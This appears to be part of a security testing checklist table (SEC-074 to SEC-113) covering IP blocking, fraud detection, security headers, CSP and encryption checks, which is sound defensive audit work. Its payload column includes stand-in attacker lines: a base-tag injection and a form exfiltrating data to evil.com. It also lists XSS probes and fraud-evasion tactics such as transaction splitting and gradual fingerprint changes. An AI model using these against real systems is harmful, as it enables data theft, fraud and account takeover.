| SEC-074 | IP Blocking Denial of Service | Business Logic (WSTG-BUSL-05) | IP Blocking | 1. Check if an attacker can cause legitimate users to be blocked.<br>2. Spoof the victim's IP in headers if trusted.<br>3. Send malicious traffic from shared IP like corporate NAT.<br>4. Test for collateral blocking. | Application must implement IP blocking with safeguards against legitimate user blocking and use behavioral analysis beyond simple IP. | <code>Spoof X-Forwarded-For with victim IP if server trusts header;send attack traffic from shared NAT IP</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| SEC-075 | Geographic IP Blocking Bypass | Broken Access Control (WSTG-AUTHZ-02) | IP Blocking | 1. If geo-blocking is implemented test bypass via VPN.<br>2. Test with TOR exit nodes.<br>3. Check for geo-IP database accuracy.<br>4. Test with IP addresses near geo boundaries. | Application must implement robust geo-blocking that considers VPN and proxy evasion and regularly update geo-IP databases. | <code>Access geo-blocked content via VPN in allowed region;use TOR;use cloud servers in allowed regions</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | VPN;TOR;Cloud Infrastructure | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-076 | Fraud Detection Bypass via Behavioral Mimicry | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Study normal user behavior patterns.<br>2. Replicate normal timing and navigation patterns in automated attacks.<br>3. Add realistic delays between actions.<br>4. Mimic human-like mouse movements and interactions. | Application must implement multi-layered fraud detection that goes beyond simple behavioral patterns including device fingerprinting and transaction analysis. | <code>Add random delays 1-5 seconds between requests;mimic normal click patterns;use realistic User-Agent strings;vary request timing</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Selenium;Puppeteer;Custom Scripts | CWE-840; PortSwigger Business logic |
| SEC-077 | Fraud Detection Response Analysis | Information Disclosure (WSTG-INFO-05) | Fraud Detection | 1. Trigger fraud detection on purpose.<br>2. Analyze the response for clues about detection criteria.<br>3. Compare responses for flagged vs clean requests.<br>4. Check for information leakage about fraud rules. | Application must not reveal fraud detection criteria or rules through response differences and must handle flagged transactions uniformly. | <code>Compare responses for normal vs suspicious transactions;check for fraud_score;risk_level;detection_reason in responses</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-078 | Fraud Detection Timing Attack | Information Disclosure (WSTG-INFO-01) | Fraud Detection | 1. Submit transactions designed to trigger fraud checks.<br>2. Measure response times for flagged vs clean transactions.<br>3. Use timing differences to determine fraud thresholds.<br>4. Map fraud detection rules through timing analysis. | Application must ensure consistent response times regardless of fraud detection outcomes to prevent timing-based rule discovery. | <code>Compare timing for transaction_amount=49.99 vs 50.01 (potential threshold);measure response times across multiple variables</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-079 | Account Takeover Detection Bypass | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Login from a new device or location.<br>2. Check if anomaly detection triggers.<br>3. Gradually change device fingerprint components.<br>4. Test with slow IP address changes.<br>5. Bypass device fingerprinting. | Application must implement robust account takeover detection that cannot be gradually evaded through incremental changes. | <code>Slowly change User-Agent components over time;change IP address gradually;modify device fingerprint incrementally</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| SEC-080 | Payment Fraud Detection Evasion | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Test with amounts just below fraud thresholds.<br>2. Split large transactions into smaller ones.<br>3. Use different payment methods for split transactions.<br>4. Test velocity-based detection limits. | Application must detect fraud patterns including transaction splitting and velocity abuse across payment methods and accounts. | <code>Split $10000 transaction into 10x$999;alternate payment methods;space transactions over time;test threshold boundaries</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| SEC-081 | Multi-Account Fraud Detection Bypass | Business Logic (WSTG-BUSL-05) | Fraud Detection | 1. Create multiple accounts with slight variations.<br>2. Use different email addresses with same patterns.<br>3. Share payment methods across accounts.<br>4. Test device fingerprint uniqueness detection. | Application must detect multi-account fraud through cross-account analysis of device fingerprints and payment methods and behavioral patterns. | <code>Create accounts with test1@email.com;test2@email.com from same device;share payment method across accounts</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Custom Scripts;Selenium | CWE-840; PortSwigger Business logic |
| SEC-082 | Fraud Rule Enumeration | Information Disclosure (WSTG-INFO-04) | Fraud Detection | 1. Systematically test different transaction parameters.<br>2. Vary amounts and frequencies and locations.<br>3. Map which parameter combinations trigger fraud.<br>4. Document fraud detection thresholds. | Application must implement non-deterministic fraud detection that cannot be fully mapped through systematic testing. | <code>Test amounts from $1 to $10000 in increments;vary IP locations;change transaction frequency;map fraud trigger points</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| SEC-083 | X-Frame-Options Header Verification | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for X-Frame-Options header on all responses.<br>2. Verify value is DENY or SAMEORIGIN.<br>3. Test if the page can be framed from external origin.<br>4. Check for CSP frame-ancestors directive as alternative. | Application must set X-Frame-Options: DENY or SAMEORIGIN on all responses to prevent clickjacking or use CSP frame-ancestors. | <code>Check response for X-Frame-Options header;test with &lt;iframe src='https://target.com'&gt; from different origin</code> | Clickjacking of a sensitive action -&gt; UI-redress-driven state change. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;SecurityHeaders.com;Browser | CWE-1021; [CSRF kit](#/checklist/csrf); OWASP Clickjacking; PortSwigger |
| SEC-084 | X-Content-Type-Options Header Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for X-Content-Type-Options: nosniff header.<br>2. Verify it is present on all responses.<br>3. Test MIME type sniffing by serving JS with text/plain content type.<br>4. Check for content type confusion vulnerabilities. | Application must set X-Content-Type-Options: nosniff on all responses to prevent MIME type sniffing attacks. | <code>Check for missing X-Content-Type-Options;serve &lt;script&gt;alert(1)&lt;/script&gt; with Content-Type: text/plain and check browser behavior</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;SecurityHeaders.com | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-085 | X-XSS-Protection Header Verification | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for X-XSS-Protection header.<br>2. Verify value is 1; mode=block or 0 (disabled as CSP is preferred).<br>3. Check if XSS auditor can be abused for information leakage.<br>4. Verify CSP is used instead. | Application should use Content-Security-Policy instead of X-XSS-Protection as the XSS auditor can be abused for side-channel attacks in some browsers. | <code>Check for X-XSS-Protection: 1; mode=block or X-XSS-Protection: 0 with proper CSP implementation</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Low | 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N) | Burp Suite;SecurityHeaders.com | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-086 | Referrer-Policy Header Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for Referrer-Policy header on all responses.<br>2. Verify policy restricts referrer information to third parties.<br>3. Test with links to external sites.<br>4. Verify sensitive URLs are not leaked via Referer header. | Application must set Referrer-Policy to strict-origin-when-cross-origin or no-referrer to prevent leaking sensitive URL information. | <code>Check for Referrer-Policy header;click external links and verify Referer header content;check for token leakage in referrer</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-087 | Permissions-Policy Header Verification | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for Permissions-Policy (formerly Feature-Policy) header.<br>2. Verify geolocation and camera and microphone and payment permissions are restricted.<br>3. Test if restricted features are accessible from iframes. | Application must set Permissions-Policy header to restrict unnecessary browser features and prevent feature abuse in embedded contexts. | <code>Check for Permissions-Policy: geolocation=(); camera=(); microphone=(); payment=() in response headers</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;SecurityHeaders.com | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-088 | Cache-Control Headers for Sensitive Pages | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Access sensitive pages like account settings and payment details and personal information.<br>2. Check Cache-Control headers.<br>3. Verify no-store and no-cache directives on sensitive responses.<br>4. Check Pragma header. | Sensitive pages must include Cache-Control: no-store; no-cache; must-revalidate and Pragma: no-cache to prevent caching of sensitive data. | <code>Check sensitive page responses for Cache-Control: no-store;Pragma: no-cache;Expires: 0;verify back button doesn't show cached data</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-089 | Cross-Origin Headers Assessment | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check CORS headers Access-Control-Allow-Origin.<br>2. Test with arbitrary Origin header.<br>3. Check for wildcard (&#42;) origin allowance.<br>4. Check Access-Control-Allow-Credentials with wildcard.<br>5. Test for null origin acceptance. | Application must implement strict CORS policies with specific allowed origins and never use wildcard with credentials or accept null origin. | <code>Send Origin: https://evil.com and check if reflected;test Origin: null;check for Access-Control-Allow-Origin: &#42;;verify credentials flag</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;cURL;Postman | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-090 | Missing Security Headers Comprehensive Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Scan all response headers for comprehensive security header presence.<br>2. Check for all recommended security headers.<br>3. Identify missing headers.<br>4. Verify header values are correctly configured. | Application must implement all recommended security headers with proper values including HSTS and CSP and X-Frame-Options and X-Content-Type-Options. | <code>Check for all headers: HSTS;CSP;X-Frame-Options;X-Content-Type-Options;Referrer-Policy;Permissions-Policy;CORP;COEP;COOP</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | SecurityHeaders.com;Burp Suite;Mozilla Observatory | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-091 | Cross-Origin-Resource-Policy (CORP) Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for Cross-Origin-Resource-Policy header on sensitive resources.<br>2. Verify value is same-origin or same-site as appropriate.<br>3. Test if sensitive resources can be loaded cross-origin. | Application must set Cross-Origin-Resource-Policy: same-origin on sensitive resources to prevent cross-origin information leakage. | <code>Check API responses and sensitive resources for Cross-Origin-Resource-Policy header;attempt cross-origin resource loading</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-092 | Server Header Information Disclosure | Information Disclosure (WSTG-INFO-02) | Security Headers | 1. Check Server response header for version information.<br>2. Check X-Powered-By header.<br>3. Check X-AspNet-Version and X-AspNetMvc-Version.<br>4. Verify no technology stack information is disclosed. | Application must remove or obscure server technology information from response headers to prevent targeted attacks. | <code>Check for Server: Apache/2.4.49;X-Powered-By: Express;X-AspNet-Version: 4.0;X-Generator: WordPress</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;cURL;Nmap | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-093 | CSP Presence and Basic Validation | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check for Content-Security-Policy header on all responses.<br>2. Verify CSP is not in report-only mode for production.<br>3. Parse and analyze all CSP directives.<br>4. Check for overly permissive policies. | Application must implement a strict Content-Security-Policy header that restricts script sources and prevents inline script execution. | <code>Check for Content-Security-Policy header;verify not Content-Security-Policy-Report-Only;analyze directive strictness</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator;SecurityHeaders.com | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-094 | CSP unsafe-inline Detection | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP allows unsafe-inline for script-src.<br>2. Check if unsafe-inline is present in style-src.<br>3. Test if inline scripts execute despite CSP.<br>4. Check for nonce or hash-based inline allowance. | CSP must not use unsafe-inline for script-src and should use nonce or hash-based approaches for necessary inline scripts. | <code>Check CSP for script-src 'unsafe-inline';inject &lt;script&gt;alert(1)&lt;/script&gt; to verify inline scripts are blocked</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-095 | CSP unsafe-eval Detection | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP allows unsafe-eval for script-src.<br>2. Test if eval() and setTimeout(string) and new Function() work.<br>3. Verify if unsafe-eval can be removed without breaking functionality. | CSP must not use unsafe-eval for script-src to prevent dynamic code execution attacks. | <code>Check CSP for script-src 'unsafe-eval';test eval('alert(1)');setTimeout('alert(1)',0);new Function('alert(1)')()</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-096 | CSP Wildcard and Overly Permissive Sources | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check CSP for wildcard (&#42;) in script-src.<br>2. Check for overly broad domain whitelisting.<br>3. Check for data: URI allowance in script-src.<br>4. Check for blob: URI allowance.<br>5. Identify CDN domains that allow user-uploaded scripts. | CSP must not use wildcard or overly broad domain patterns in script-src and must not allow data: or blob: URIs for scripts. | <code>Check for script-src &#42;;script-src &#42;.cloudfront.net;script-src data:;script-src blob:;check for exploitable CDN domains</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-097 | CSP Bypass via Allowed Domain Exploitation | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Identify all domains whitelisted in CSP script-src.<br>2. Check each domain for exploitable endpoints like JSONP or Angular template injection.<br>3. Look for open redirects on whitelisted domains.<br>4. Test for CSP bypass through whitelisted CDNs. | CSP whitelisted domains must not contain exploitable endpoints that could be abused to execute arbitrary JavaScript. | <code>Check whitelisted CDN for JSONP: https://whitelisted.cdn.com/jsonp?callback=alert(1)//;find Angular/React template injection on whitelisted domain</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator;Custom Scripts | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-098 | CSP Nonce Predictability and Reuse | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. If CSP uses nonces collect multiple page loads and extract nonces.<br>2. Analyze nonce entropy and randomness.<br>3. Check if nonces are reused across requests.<br>4. Verify nonce length is adequate. | CSP nonces must be cryptographically random with at least 128 bits of entropy and unique per response. | <code>Collect 100+ nonces from page loads;analyze with Burp Sequencer;check for reuse;verify minimum 16 bytes base64</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Sequencer;Custom Scripts | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-099 | CSP Reporting Endpoint Security | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP report-uri or report-to is configured.<br>2. Test if the reporting endpoint is accessible without authentication.<br>3. Attempt to flood the reporting endpoint.<br>4. Check for sensitive data in CSP reports. | CSP reporting endpoints must be protected against abuse and must not expose sensitive information in violation reports. | <code>Send crafted CSP violation reports to /csp-report;flood endpoint;check if reports contain sensitive URL paths or data</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-100 | CSP base-uri Directive Check | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP includes base-uri directive.<br>2. If missing inject a base tag to hijack relative URLs.<br>3. Test if script loading can be redirected via base URI injection.<br>4. Verify base-uri is set to self or none. | CSP must include base-uri 'self' or base-uri 'none' to prevent base tag injection attacks that redirect relative script URLs. | <code>Inject &lt;base href='https://evil.com/'&gt; and check if relative script src loads from attacker domain</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-101 | CSP object-src and plugin-types Check | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP restricts object-src.<br>2. Verify plugin-types directive if objects are allowed.<br>3. Test if Flash or Java applets can be loaded.<br>4. Check for PDF plugin exploitation. | CSP must restrict object-src to 'none' unless specific plugin requirements exist to prevent plugin-based attacks. | <code>Check for object-src 'none';test &lt;object data='https://evil.com/exploit.swf'&gt;;test &lt;embed src='malicious.pdf'&gt;</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-102 | CSP form-action Directive Check | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP includes form-action directive.<br>2. If missing inject a form with action pointing to attacker server.<br>3. Test if form data can be exfiltrated via unrestricted form-action.<br>4. Check for dangling markup injection. | CSP must include form-action directive to prevent form data exfiltration through injected forms pointing to attacker-controlled servers. | <code>Inject &lt;form action='https://evil.com/steal'&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;;test form-action restriction</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-103 | Data in Transit Encryption Verification | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Monitor all network traffic between client and server.<br>2. Verify all communications use TLS.<br>3. Check for any plain-text data transmission.<br>4. Verify API communications are encrypted.<br>5. Check WebSocket encryption (wss://). | All data in transit must be encrypted using TLS 1.2+ with no plain-text fallback for any communication channel. | <code>Capture traffic with Wireshark;check for HTTP requests;verify all API calls use HTTPS;check WebSocket uses wss://</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Wireshark;Burp Suite;SSLscan | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-104 | Password Hashing Algorithm Verification | Cryptography (WSTG-CRYP-02) | Encryption (At Rest / In Transit) | 1. Check password storage mechanism.<br>2. Verify strong hashing algorithm like bcrypt or scrypt or Argon2 is used.<br>3. Check for salting.<br>4. Verify no MD5 or SHA1 or unsalted hashes.<br>5. Check work factor configuration. | Passwords must be hashed using Argon2 or bcrypt or scrypt with unique salts per password and an appropriate work factor. | <code>Register account then check database for password_hash format;verify $2b$ (bcrypt) or $argon2 prefix;check for MD5/SHA1/plain-text</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Database Analysis;Manual Review | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-105 | Sensitive Data Encryption at Rest | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check database for encrypted sensitive fields.<br>2. Verify PII and payment data encryption.<br>3. Check encryption algorithm strength (AES-256).<br>4. Verify key management practices.<br>5. Check for encrypted backups. | Sensitive data including PII and payment information must be encrypted at rest using AES-256 or equivalent with proper key management. | <code>Check database for plaintext credit_card;ssn;personal_data fields;verify AES-256 encryption;check backup encryption</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Database Analysis;Manual Review | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-106 | Encryption Key Management Assessment | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check where encryption keys are stored.<br>2. Verify keys are not hardcoded in source code.<br>3. Check for key rotation mechanisms.<br>4. Verify key separation between environments.<br>5. Check for HSM or KMS usage. | Encryption keys must be stored in secure key management systems and not in source code with regular rotation and environment separation. | <code>Search source code for hardcoded keys;check for encryption_key=;aes_key=;secret_key= in configuration files</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | GitLeaks;TruffleHog;Manual Review | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-107 | Weak Encryption Algorithm Detection | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Identify all encryption algorithms used.<br>2. Check for DES or 3DES or RC4 or MD5 usage.<br>3. Verify RSA key length is at least 2048 bits.<br>4. Check for ECB mode usage.<br>5. Verify IV generation for CBC mode. | Application must use only strong encryption algorithms (AES-256-GCM or ChaCha20-Poly1305) and avoid deprecated or weak algorithms. | <code>Check for DES;3DES;RC4;Blowfish;MD5 for encryption;RSA &lt; 2048 bits;AES-ECB mode;static or predictable IVs</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Source Code Analysis;Custom Scripts | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-108 | Token and Session Encryption Assessment | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Analyze session token generation for entropy.<br>2. Check JWT signing algorithms.<br>3. Verify API tokens are properly encrypted or hashed.<br>4. Check for weak token signing secrets.<br>5. Test for algorithm confusion. | Session tokens and API keys must be generated with sufficient entropy and JWTs must use strong signing algorithms (RS256 or ES256) not HS256 with weak secrets. | <code>Analyze token entropy with Burp Sequencer;crack JWT HS256 with jwt_tool;test for alg=none bypass;check for weak secrets</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Sequencer;jwt_tool;Hashcat | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| SEC-109 | Database Connection Encryption | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check if database connections use TLS.<br>2. Verify database connection strings for SSL parameters.<br>3. Check for plain-text database credentials in configuration.<br>4. Test for database traffic encryption. | Database connections must use TLS encryption and credentials must be stored securely in environment variables or secret management systems. | <code>Check connection strings for sslmode=require;verify database traffic encryption;check for plaintext DB credentials</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Wireshark;Configuration Review | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-110 | File Storage Encryption Verification | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check if uploaded files are encrypted at rest.<br>2. Verify S3 bucket encryption settings.<br>3. Check local file storage encryption.<br>4. Verify temporary files are encrypted.<br>5. Check log file encryption. | User-uploaded files and sensitive data files must be encrypted at rest using server-side encryption with proper key management. | <code>Check S3 for ServerSideEncryption;verify local file encryption;check temporary file handling;audit log storage encryption</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | AWS CLI;Manual Review | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-111 | Email Encryption Verification | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check if transactional emails use TLS for SMTP.<br>2. Verify STARTTLS enforcement.<br>3. Check for sensitive data in email content.<br>4. Verify email encryption for sensitive communications. | Application must enforce TLS for all SMTP communications and minimize sensitive data in email content. | <code>Check SMTP connection for STARTTLS;verify opportunistic vs mandatory TLS;inspect email headers for encryption status</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | OpenSSL;SMTP Tester;Wireshark | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-112 | Automated Vulnerability Scanner Execution | Vulnerability Assessment (WSTG-INFO-08) | Vulnerability Scanning | 1. Run automated vulnerability scanners against the application.<br>2. Configure scanner with authentication credentials.<br>3. Set appropriate scan policies covering OWASP Top<br>10. 4. Review and validate all findings.<br>5. Eliminate false positives. | Application must be free from vulnerabilities detectable by automated scanning tools including all OWASP Top 10 categories. | <code>Run full authenticated scan with OWASP ZAP;Burp Suite Active Scanner;Nikto;Nuclei against all application endpoints</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | OWASP ZAP;Burp Suite Pro;Nikto;Nuclei;Nessus | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-113 | Dependency Vulnerability Scanning | Supply Chain (WSTG-CONF-01) | Vulnerability Scanning | 1. Scan all application dependencies for known vulnerabilities.<br>2. Check frontend JavaScript libraries.<br>3. Check backend framework dependencies.<br>4. Verify container base image vulnerabilities.<br>5. Check for end-of-life components. | All application dependencies must be free from known critical and high vulnerabilities and end-of-life components must be replaced. | <code>Run npm audit;pip-audit;OWASP Dependency-Check;Snyk;Trivy on all project dependencies</code> | Supply-chain / dependency confusion -&gt; build &amp; CI compromise -&gt; RCE. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | OWASP Dependency-Check;Snyk;npm audit;retire.js;Trivy | CWE-829; [Dependency Confusion kit](#/checklist/depconfusion); Alex Birsan Dependency Confusion |
